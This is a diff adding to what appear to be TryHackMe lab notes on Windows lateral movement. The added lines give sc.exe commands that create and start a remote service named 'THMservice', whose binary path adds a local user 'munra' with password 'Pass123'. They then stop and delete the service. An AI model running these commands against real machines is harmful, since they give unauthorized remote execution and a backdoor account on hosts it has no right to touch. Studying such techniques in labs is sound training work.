@@ -52,3 +52,14 @@ Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami
     - 445/TCP (RPC over SMB Named Pipes)
     - 139/TCP (RPC over SMB Named Pipes)
 - Required Group Memberships: Administrators  
+We can create and start a service named "THMservice" using the following commands:  
+```
+sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
+sc.exe \\TARGET start THMservice
+```
+To stop and delete the service, we can then execute the following commands:
+```
+sc.exe \\TARGET stop THMservice
+sc.exe \\TARGET delete THMservice
+```
+
